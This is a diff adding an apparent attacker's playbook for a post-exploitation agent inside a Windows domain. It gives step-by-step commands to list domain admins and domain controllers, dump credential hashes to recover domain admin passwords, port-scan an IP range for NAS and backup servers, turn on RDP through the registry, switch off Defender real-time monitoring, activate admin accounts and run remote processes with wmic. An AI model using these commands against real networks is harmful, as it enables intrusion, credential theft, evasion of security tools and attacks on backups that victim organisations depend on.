@@ -1,0 +1,40 @@
+GO TO THE AGENT:
+RIGHT-CLICK ON THE AGENT AND CLICK
+
+1) LIST OF ADMINISTRATORS shell net group "domain admins" /domain
+
+2) look at domain shell net view /all /domain
+
+3) LIST OF DCs shell nltest /dclist: "NameDomain"
+
+4) SEE LIST OF SERVERS
+INSTALL THE PowerView MODULE
+RIGHT-CLICK ON THE AGENT Get Info > Get Servers
+GET LIST OF SERVERS
+
+5)GET LIST OF COMPUTERS
+AS THE PowerView MODULE IS UNDER GUIDED
+RIGHT-CLICK YOUR MOUSE on the Get Info > Get All Computers Agent
+GET LIST OF COMPUTERS
+
+6) FIND OUT PASSWORDS OF ALL DOMAIN ADMINS
+RIGHT CLICK ON THE AGENT
+CLICK ACCESS > DUMP HASHES
+GO TO HIGHER TAB VIEW > CREDENTIALS
+GET ALL THE HASHES AND LOOK FOR DOMAIN ADMINS
+
+7)WE NEED TO FIND NAS, BACKUP
+THIS IS THE COMMAND WE KNOW ALL SUBNETS OF THIS DOMAIN
+THIS COMMAND FIND OUT AT WHAT IP ADDRESS IS NAS, BACKUP
+portscan 107.191.177.1-107.191.177.255 5000 icmp 1024
+
+THIS IS A LIST OF USEFUL COMMANDS THAT MAY COME IN HANDY:
+
+release agent's rights before default                   rev2self
+switch user on via                                      shell net user admin /active:yes
+USER INFORMATION                                        shell net user careadmin /domain
+Turn ON RDP CONNECTION                                  shell reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control_Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+DISCONNECTING DEFENDER                                  powershell Set-MpPreference -DisableRealtimeMonitoring $true
+POLICY REVIEW                                           shell repadmin /syncall /AdeP
+SHOW HOME TRUSTS                                        shell nltest /domain_trusts /all_trusts
+                                                        shell wmic /node: "PC NAME" process call create "COMMAND TO DO"
